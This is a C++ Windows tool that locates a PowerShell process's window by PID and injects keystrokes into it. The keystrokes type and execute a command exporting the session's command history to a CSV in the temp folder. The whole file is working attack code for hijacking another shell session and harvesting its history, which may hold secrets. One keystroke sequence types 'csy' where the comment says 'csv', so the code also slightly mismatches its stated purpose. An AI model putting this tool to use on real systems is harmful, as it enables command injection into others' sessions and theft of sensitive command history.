#include <afx.h>

void SendKeyboardCommand(HWND hWnd, int command)
{
	printf("[+]Sending:0x%02X\r\n", command);
	PostMessage(hWnd, WM_KEYDOWN, command, 0);
	PostMessage(hWnd, WM_KEYUP, command, 0xC0000000);
}

void SendShiftKeyboardCommand(HWND hWnd, int command)
{
	printf("[+]Sending:0xA0+0x%02X\r\n", command);
	keybd_event(VK_LSHIFT, 0, 0, 0);
	PostMessage(hWnd, WM_KEYDOWN, command, 0);
	PostMessage(hWnd, WM_KEYUP, command, 0xC0000000);
	keybd_event(VK_LSHIFT, 0, KEYEVENTF_KEYUP, 0);
}

HWND GetWindowHandleByPID(DWORD dwProcessID)
{
	HWND hWnd = GetTopWindow(0);
	while (hWnd)
	{
		DWORD pid = 0;
		DWORD dwTheardId = GetWindowThreadProcessId(hWnd, &pid);
		if (dwTheardId != 0)
		{
			if (pid == dwProcessID)
			{
				printf("[+]hWnd:%x\r\n", hWnd);
				return hWnd;
			}
		}
		hWnd = ::GetNextWindow(hWnd, GW_HWNDNEXT);
	}
	return NULL;
}

int main(int argc, char* argv[])
{
	if (argc != 2)
	{
		printf("\nSend keyboard messages to specified powershell process.\n");
		printf("Default command:Get-History|export-csv $env:temp\"\\history.csv\"\n");
		printf("Usage:\n");
		printf("     %s <pid>\n", argv[0]);
		return 0;
	}
	DWORD pid;
	sscanf_s(argv[1], "%d", &pid);

	HWND hWnd = GetWindowHandleByPID(pid);
	if (hWnd == NULL)
	{
		printf("[!]I can't find it.\r\n");
		return 0;
	}
	
	//Get-History|export-csv $env:temp"\history.csv"
	SendKeyboardCommand(hWnd, 'G');
	SendKeyboardCommand(hWnd, 'E');
	SendKeyboardCommand(hWnd, 'T');
	SendKeyboardCommand(hWnd, VK_OEM_MINUS);
	SendKeyboardCommand(hWnd, 'H');
	SendKeyboardCommand(hWnd, 'I');
	SendKeyboardCommand(hWnd, 'S');
	SendKeyboardCommand(hWnd, 'T');
	SendKeyboardCommand(hWnd, 'O');
	SendKeyboardCommand(hWnd, 'R');
	SendKeyboardCommand(hWnd, 'Y');
	SendShiftKeyboardCommand(hWnd, VK_OEM_5);
	SendKeyboardCommand(hWnd, 'E');
	SendKeyboardCommand(hWnd, 'X');
	SendKeyboardCommand(hWnd, 'P');
	SendKeyboardCommand(hWnd, 'O');
	SendKeyboardCommand(hWnd, 'R');
	SendKeyboardCommand(hWnd, 'T');
	SendKeyboardCommand(hWnd, VK_OEM_MINUS);
	SendKeyboardCommand(hWnd, 'C');
	SendKeyboardCommand(hWnd, 'S');
	SendKeyboardCommand(hWnd, 'V');
	SendKeyboardCommand(hWnd, VK_SPACE);
	SendShiftKeyboardCommand(hWnd, 0x34);
	SendKeyboardCommand(hWnd, 'E');
	SendKeyboardCommand(hWnd, 'N');
	SendKeyboardCommand(hWnd, 'V');
	SendShiftKeyboardCommand(hWnd, VK_OEM_1);
	SendKeyboardCommand(hWnd, 'T');
	SendKeyboardCommand(hWnd, 'E');
	SendKeyboardCommand(hWnd, 'M');
	SendKeyboardCommand(hWnd, 'P');
	SendShiftKeyboardCommand(hWnd, VK_OEM_7);
	SendKeyboardCommand(hWnd, VK_OEM_5);
	SendKeyboardCommand(hWnd, 'H');
	SendKeyboardCommand(hWnd, 'I');
	SendKeyboardCommand(hWnd, 'S');
	SendKeyboardCommand(hWnd, 'T');
	SendKeyboardCommand(hWnd, 'O');
	SendKeyboardCommand(hWnd, 'R');
	SendKeyboardCommand(hWnd, 'Y');
	SendKeyboardCommand(hWnd, VK_OEM_PERIOD);
	SendKeyboardCommand(hWnd, 'C');
	SendKeyboardCommand(hWnd, 'S');
	SendKeyboardCommand(hWnd, 'Y');
	SendShiftKeyboardCommand(hWnd, VK_OEM_7);
	
	//Enter
	SendKeyboardCommand(hWnd, VK_RETURN);

	return 0;
}
